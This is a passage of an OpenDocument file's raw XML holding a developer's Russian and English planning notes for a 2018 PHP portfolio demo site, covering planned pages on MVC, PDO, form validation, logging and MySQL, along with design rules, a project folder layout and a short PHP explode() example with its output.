    </style:style>
    <style:style style:name="T171" style:family="text">
      <style:text-properties officeooo:rsid="003eb51c"/>
    </style:style>
    <style:style style:name="T172" style:family="text">
      <style:text-properties officeooo:rsid="003f9523"/>
    </style:style>
    <style:style style:name="T173" style:family="text">
      <style:text-properties fo:color="#6897bb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T174" style:family="text">
      <style:text-properties fo:color="#6897bb" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T175" style:family="text">
      <style:text-properties officeooo:rsid="00409c94"/>
    </style:style>
    <style:style style:name="T176" style:family="text">
      <style:text-properties fo:color="#4e9a06" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T177" style:family="text">
      <style:text-properties officeooo:rsid="00423cc4"/>
    </style:style>
    <style:style style:name="T178" style:family="text">
      <style:text-properties officeooo:rsid="00458729"/>
    </style:style>
    <style:style style:name="T179" style:family="text">
      <style:text-properties style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="T180" style:family="text">
      <style:text-properties style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T181" style:family="text">
      <style:text-properties officeooo:rsid="00482be4"/>
    </style:style>
    <style:style style:name="T182" style:family="text">
      <style:text-properties officeooo:rsid="004a1d91"/>
    </style:style>
    <style:style style:name="T183" style:family="text">
      <style:text-properties officeooo:rsid="004ec2bc"/>
    </style:style>
    <style:style style:name="T184" style:family="text">
      <style:text-properties officeooo:rsid="0055528d"/>
    </style:style>
    <style:style style:name="T185" style:family="text">
      <style:text-properties officeooo:rsid="005c20fe"/>
    </style:style>
    <style:style style:name="T186" style:family="text">
      <style:text-properties officeooo:rsid="005dbac4"/>
    </style:style>
    <style:style style:name="T187" style:family="text">
      <style:text-properties officeooo:rsid="00611894"/>
    </style:style>
    <style:style style:name="T188" style:family="text">
      <style:text-properties fo:color="#808080" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T189" style:family="text">
      <style:text-properties fo:color="#808080" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T190" style:family="text">
      <style:text-properties fo:color="#ffc66d" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T191" style:family="text">
      <style:text-properties fo:color="#ffc66d" style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00b03d32" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T192" style:family="text">
      <style:text-properties fo:color="#ffc66d" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T193" style:family="text">
      <style:text-properties fo:color="#ffc66d" style:font-name="DejaVu Sans Mono" fo:font-style="italic" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T194" style:family="text">
      <style:text-properties officeooo:rsid="009d6c29"/>
    </style:style>
    <style:style style:name="T195" style:family="text">
      <style:text-properties style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T196" style:family="text">
      <style:text-properties officeooo:rsid="009f3861" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T197" style:family="text">
      <style:text-properties officeooo:rsid="00a0e821" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T198" style:family="text">
      <style:text-properties officeooo:rsid="00a2a861" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T199" style:family="text">
      <style:text-properties officeooo:rsid="00a457f1" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T200" style:family="text">
      <style:text-properties officeooo:rsid="00a657eb" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T201" style:family="text">
      <style:text-properties officeooo:rsid="00a83f54" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T202" style:family="text">
      <style:text-properties officeooo:rsid="00a988a7" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T203" style:family="text">
      <style:text-properties officeooo:rsid="00aa62b4" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T204" style:family="text">
      <style:text-properties officeooo:rsid="00abd81d" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T205" style:family="text">
      <style:text-properties officeooo:rsid="00b46af1" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T206" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T207" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00abd81d" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T208" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00ad3099" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T209" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00ada864" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T210" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00adb897" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T211" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00ae4e1a" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T212" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00b03d32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T213" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00b12e8e" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T214" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00b46af1" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T215" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00b03d32" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T216" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" officeooo:rsid="00b12e8e" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T217" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T218" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00b9fa97" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T219" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00bad686" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T220" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00bc7c07" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T221" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00bd1b96" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T222" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00bdafc5" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T223" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00bde7b9" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T224" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00bea77d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T225" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00bf64c0" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T226" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c1ecb0" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T227" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c2480e" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T228" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c27583" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T229" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c3b89a" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T230" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c566fa" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T231" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c5bb92" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T232" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c6f887" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T233" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c8e1d9" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T234" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c99d31" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T235" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c9b949" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T236" style:family="text">
      <style:text-properties officeooo:rsid="00ce7af6"/>
    </style:style>
    <style:style style:name="T237" style:family="text">
      <style:text-properties officeooo:rsid="00d5879d"/>
    </style:style>
    <style:style style:name="T238" style:family="text">
      <style:text-properties officeooo:rsid="00d69ac1"/>
    </style:style>
    <style:style style:name="T239" style:family="text">
      <style:text-properties officeooo:rsid="00d75160"/>
    </style:style>
    <style:style style:name="T240" style:family="text">
      <style:text-properties officeooo:rsid="00d8a2e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mo</text:p>
      <text:p text:style-name="P1">Наб<text:span text:style-name="T187">р</text:span>оски, идеи, заметки по архитектуре стилю, контенту.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">Разбиение базы демонстрируемых знаний по страницам</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T27">0</text:span>. <text:span text:style-name="T9">Главная страница</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1">Демонстрация</text:span> <text:span text:style-name="T27">вывода контента из бд по принципу MVC и поисковика по сайту.</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1">Текст</text:span> <text:span text:style-name="T27">о проекте и контакты</text:span>. </text:p>
      <text:p text:style-name="P6">1. <text:span text:style-name="T3">Работа с данными простых типов</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">Демонстрация</text:span> встроенных удобных функций работы со строками, массивами и числами.</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">Текст</text:span> о пользе и правильности использования встроенных функций и существующих решений в целом. </text:p>
      <text:p text:style-name="P20">Вставки<text:span text:style-name="T10"> этих самых функций и сравнение с авторски написанным ручным кодом.</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T22">2</text:span>. <text:span text:style-name="T3">Работа со своими функциями</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">Демонстрация</text:span> собственных функций с использованием разных видов передачи параметров, строгой типизации, возвращаемого false, возможного возвращаемого null в строго типизированной функции и фишечек php 7, <text:span text:style-name="T21">возможная отловка ошибки.</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">Текст</text:span> о плюсах и минусах разных стилей написания кода функций, немного об ООП и его недостатках и актуальности, <text:span text:style-name="T29">соблюдении PSR.</text:span></text:p>
      <text:p text:style-name="P20">Вставки<text:span text:style-name="T10"> этих самых функций.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T22">3</text:span>. <text:span text:style-name="T3">Работа с </text:span><text:span text:style-name="T4">формами</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T1">Демонстрация</text:span> <text:span text:style-name="T22">обработки пользовательского ввода, проверки регулярными выражениями до отправки и после отправки, вывод переспективных SQL запросов, экранирование параметров. Поисковая строка, что ищет номер строки среди дюжины выведенных по паттерну (подробнее о ПДО смотрите на «ссылка на страницу о БД и ПДО)</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T1">Текст</text:span> <text:span text:style-name="T22">об экранировании, способах защиты от XSS через обработку форм</text:span>. </text:p>
      <text:p text:style-name="P21">Вставки<text:span text:style-name="T10"> </text:span><text:span text:style-name="T11">функций проверки на ключи в исходном массиве, регулярных выражениях, повествование о плюсах и минусах использования регулярок</text:span><text:span text:style-name="T10">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T23">4</text:span>. <text:span text:style-name="T3">Работа с </text:span><text:span text:style-name="T5">БД через ПДО</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Демонстрация</text:span> <text:s/><text:span text:style-name="T23">вывода страницы, которая хранится в БД (подробнее о принципах разделения дизайна и кода читайте «ссылка на страницу об MVC») работы с ПДО через удобные функции, экранирования, настройки кодировки и вывода русского текста</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Текст</text:span> <text:span text:style-name="T22">об экранировании, способах защиты, о том, что у каждого опытного разраба есть свой собственно написанный класс для работы с ПДО (например мой — просто возвращает соединение, соблюдая singleton)</text:span></text:p>
      <text:p text:style-name="P22"><text:soft-page-break/>Вставки<text:span text:style-name="T10"> </text:span><text:span text:style-name="T11">функций </text:span><text:span text:style-name="T12">экранирования, именованных заполнителей, собственного класса PDO.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T24">5</text:span>. <text:span text:style-name="T6">Оптимизация и логирование</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">Демонстрация</text:span> <text:s/><text:span text:style-name="T25">логирования нажатия кнопку и загрузку страницы, функций настройки php.ini на время исполнения скрипта.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">Текст</text:span> <text:s/>- <text:span text:style-name="T25">контент внешнего сайта ruhighload.com и рассказ о том, зачем нужно логирование.</text:span></text:p>
      <text:p text:style-name="P23">Вставки<text:span text:style-name="T10"> </text:span><text:span text:style-name="T13">функций parse_ini_file, set_ini, error_log</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T25">6</text:span>. <text:span text:style-name="T7">Принцип MVC</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Демонстрация</text:span> <text:s/><text:span text:style-name="T25">принципов mvc, собственно написанного шаблонизатора, переключения стилей страницы по radio-button-у.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Текст</text:span> <text:s/><text:span text:style-name="T25">о концепции mvc и принципе работы шаблонизатора.</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T23">Вставки</text:span><text:span text:style-name="T12"> </text:span><text:span text:style-name="T13">содержимого файлов контроллера, модели и шаблона и кода шаблонизатора, написанного руками</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T194">7</text:span>. <text:span text:style-name="T8">Типы данных в mysql</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">Демонстрация</text:span> <text:s/><text:span text:style-name="T26">контента ruhighload, вывод таблицы по пользовательскому запросу</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">Текст</text:span> <text:s/><text:span text:style-name="T25">о типах данных mysql, отсылка на «работа с БД через ПДО», о созданной базе с учётом всех основных правил.</text:span></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T23">Вставки</text:span><text:span text:style-name="T12"> </text:span><text:span text:style-name="T14">содержимого БД, SQL запросов.</text:span></text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P27"><text:span text:style-name="T14">О</text:span><text:span text:style-name="T10">сновные правила дизайна сайта.</text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T10">1.</text:span>ПРОСТОТА<text:span text:style-name="T10"> — </text:span><text:span text:style-name="T15">малое количество </text:span></text:p>
      <text:list xml:id="list1145695918527510161" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P134">элементов html</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P135">контента</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P135">границ, кнопок, форм, изображений</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P135">демонстрируемых технологий</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P29">2.<text:span text:style-name="T1">Одностильность</text:span> — придерживание одного стиля относительно</text:p>
      <text:list xml:id="list976844923768566811" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P136">набора цветов</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P136">набора шрифтов</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P136"><text:soft-page-break/>размеров элементов</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P136">строения скелета страницы</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P29">3.<text:span text:style-name="T1">Лаконичность</text:span> — одна цветовая гамма на всём сайте (тёмно-серый, светло-серый, несколько бросских цветов)</text:p>
      <text:p text:style-name="P29">4.Минимальная высота страницы — по размеру монитора и ширина — почти на максимум.</text:p>
      <text:p text:style-name="P30">5.Весь контент сайта хранится и извлекается из БД по принципу MVC</text:p>
      <text:p text:style-name="P30">6.<text:span text:style-name="T1">Элементы дизайна</text:span> - </text:p>
      <text:list xml:id="list7137549344394548993" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P137">небольшие непричёмные картинки с целью разбавки контента — одна-две на страницу</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P137">Вставки кода, выделенные как на благородных ресурсах.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P137">Hover, изменяющий цвет ссылки и небросское выделение ссылок в целом.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P40">Архитектура проекта</text:p>
      <text:p text:style-name="P90">demo</text:p>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="Standard">&gt;<text:span text:style-name="T3">vendor</text:span></text:p>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="Standard">&gt;<text:span text:style-name="T3">src</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">controller</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">service</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">repository</text:span></text:p>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="Standard">&gt;<text:span text:style-name="T3">design</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">images</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">css</text:span></text:p>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="Standard">&gt;<text:span text:style-name="T3">var</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">log</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;&gt;dev.log</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P91">&gt;<text:span text:style-name="T3">tpl</text:span></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">&gt;composer.json</text:p>
      <text:p text:style-name="Standard">&gt;composer.lock</text:p>
      <text:p text:style-name="Standard">&gt;.gitignore</text:p>
      <text:p text:style-name="P92">&gt;.env</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P39">Подробности каждой страницы</text:p>
      <text:p text:style-name="P41">0.Главная</text:p>
      <text:p text:style-name="P33"><text:soft-page-break/><text:tab/>Этот проект является демонстраций моих знаний web-технологий на момент середины апреля 2018 года. Здесь при помощи ряда страниц я показываю свой уровень понимания таких столпов web-разработки на PHP, как концепция MVC, взаимодействие с базой данных, серверная обработка форм; вопросы валидации, <text:span text:style-name="T30">санитаризации</text:span> данных, поступающих пользовательским вводом, защита от sql иъекций и XSS; высокоуровневые решения тривиальных задач, предоставляемые PHP 7, основы и интересные моменты написания собственных функций; вопросы оптимизации, проектирования базы данных, <text:span text:style-name="T28">логирования и шаблонизации</text:span>.</text:p>
      <text:p text:style-name="P31"><text:tab/><text:span text:style-name="T28">Основными ресурсами, на базе которых я формировал свой багаж знаний на данный момент являются </text:span></text:p>
      <text:p text:style-name="P31"><text:bookmark-start text:name="__DdeLink__397_639857035"/><text:a xlink:type="simple" xlink:href="http://php.net/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T28">http://php.net/</text:span></text:a><text:bookmark-end text:name="__DdeLink__397_639857035"/><text:span text:style-name="T28"> (на данном уровне моей квалификации прекрасно заменяет документацию),</text:span></text:p>
      <text:p text:style-name="P36"><text:bookmark-start text:name="__DdeLink__400_639857035"/>Дэвид Скляр, Адам Трахтенберг «PHP Cookbook 3 издание»<text:bookmark-end text:name="__DdeLink__400_639857035"/> (системматизация знаний),</text:p>
      <text:p text:style-name="P37"><text:bookmark-start text:name="__DdeLink__403_639857035"/>https://habrahabr.ru/<text:bookmark-end text:name="__DdeLink__403_639857035"/> (важные концепции простыми словами, полезные статьи), </text:p>
      <text:p text:style-name="P34"><text:bookmark-start text:name="__DdeLink__406_639857035"/><text:a xlink:type="simple" xlink:href="https://ruhighload.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://ruhighload.com/</text:a> <text:bookmark-end text:name="__DdeLink__406_639857035"/>(набор незаменимых коротких статей, многие из которых обязан прочесть каждый бэкэндер)</text:p>
      <text:p text:style-name="P32"><text:bookmark-start text:name="__DdeLink__409_639857035"/><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T28">https://stackoverflow.com/</text:span></text:a><text:bookmark-end text:name="__DdeLink__409_639857035"/><text:span text:style-name="T28"> (локальные проблемы с кодом), </text:span></text:p>
      <text:p text:style-name="P35">Контакты </text:p>
      <text:p text:style-name="P35"><text:bookmark-start text:name="__DdeLink__411_639857035"/><text:a xlink:type="simple" xlink:href="https://github.com/EugeneOwl" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/EugeneOwl</text:a><text:bookmark-end text:name="__DdeLink__411_639857035"/></text:p>
      <text:p text:style-name="P35"><text:bookmark-start text:name="__DdeLink__413_639857035"/><text:a xlink:type="simple" xlink:href="mailto:eugenevaleska1994@gmail.com" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">eugenevaleska1994@gmail.com</text:a><text:bookmark-end text:name="__DdeLink__413_639857035"/></text:p>
      <text:p text:style-name="P38"><text:bookmark-start text:name="__DdeLink__415_639857035"/><text:a xlink:type="simple" xlink:href="https://www.facebook.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.facebook.com/</text:a><text:bookmark-end text:name="__DdeLink__415_639857035"/></text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P14"><text:span text:style-name="T16"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__433_833785861"/><text:span text:style-name="T16">This project is a demonstration of my </text:span><text:span text:style-name="T18">knowledge</text:span><text:span text:style-name="T16"> at the time of the middle of April, 2018. Here with a help of set of pages I show my level of </text:span><text:span text:style-name="T19">realization</text:span><text:span text:style-name="T16"> such basics of backend PHP web-development as MVC conception, interaction with a database, secur</text:span><text:span text:style-name="T19">e</text:span><text:span text:style-name="T16"> form processing, issues of sanitation, shielding </text:span><text:span text:style-name="T17">and other ways of repelling XSS attacs and different kinds of injections which are getting in</text:span><text:span text:style-name="T20">to</text:span><text:span text:style-name="T17"> with a user input; high level solutions of trivial issues provided by PHP </text:span><text:span text:style-name="T127">(</text:span><text:span text:style-name="T31">especially </text:span><text:span text:style-name="T32">PHP 7 :) ), basic and subtle moments of writing your own functions; optimization and log issues, also issues of database design and lots of other moments connected with backend coding.</text:span><text:bookmark-end text:name="__DdeLink__433_833785861"/></text:p>
      <text:p text:style-name="P42">Basic sources of my knowledge in PHP language were</text:p>
      <text:p text:style-name="P59">1.Base types processing</text:p>
      <text:p text:style-name="P44">Сделать простую структуру шаблона:</text:p>
      <text:p text:style-name="P44">текст-вставка <text:span text:style-name="T183">кода-вставка вывода</text:span>-заключение, благодаря которой будет удавать безумно легко расширять страницу обзором новых функций.</text:p>
      <text:p text:style-name="P45"><text:tab/><text:bookmark-start text:name="__DdeLink__485_1892330286"/><text:bookmark-start text:name="__DdeLink__488_1892330286"/><text:span text:style-name="T128">PHP is a high level programming language so he has plenty set of high level built-in functions with a help of which smart engineer can create an algorithm executing really great job in a few lines. Remembering the fact of their existence and ability to instrument them as much as </text:span><text:soft-page-break/><text:span text:style-name="T128">possible is a brilliant quality of PHP developer. On this page I'd like to show some high-level simple solutions which can help to save the plenty part of code in case you are making use of them instead of writing your own algorithm to solve trivial issues <text:s/>working with base types such as strings, arrays and numerics.</text:span><text:bookmark-end text:name="__DdeLink__485_1892330286"/><text:bookmark-end text:name="__DdeLink__488_1892330286"/></text:p>
      <text:p text:style-name="P46"><text:tab/><text:bookmark-start text:name="__DdeLink__503_1892330286"/><text:span text:style-name="T129">One of the first things I'm thinking of when hearing «trivial issue» is to break a text into words to process them separately. PHP has couple built-in solutions for such situations. The most simple is to use function explode. Explode is a function which returns an array of substrings which it“s getting from a string and a delimiter you are giving to it through a parameters.</text:span><text:bookmark-end text:name="__DdeLink__503_1892330286"/></text:p>
      <text:p text:style-name="P72"><text:span text:style-name="T78"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__501_1892330286"/><text:span text:style-name="T136">$sentence </text:span><text:span text:style-name="T153">= </text:span><text:span text:style-name="T143">"Hello, great big white world!"</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$words </text:span><text:span text:style-name="T130">= explode(</text:span><text:span text:style-name="T140">" "</text:span><text:span text:style-name="T145">, </text:span><text:span text:style-name="T133">$sentence</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T130">var_dump(</text:span><text:span text:style-name="T133">$words</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span><text:bookmark-end text:name="__DdeLink__501_1892330286"/></text:p>
      <text:p text:style-name="P114"><text:bookmark-start text:name="__DdeLink__507_1892330286"/><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T154">(size=5)</text:span></text:p>
      <text:p text:style-name="P132"><text:s text:c="2"/><text:span text:style-name="T158">0 </text:span><text:span text:style-name="T166">=&gt;</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T165">string</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T168">'Hello,'</text:span><text:span text:style-name="T158"> </text:span><text:span text:style-name="T159">(length=6)</text:span></text:p>
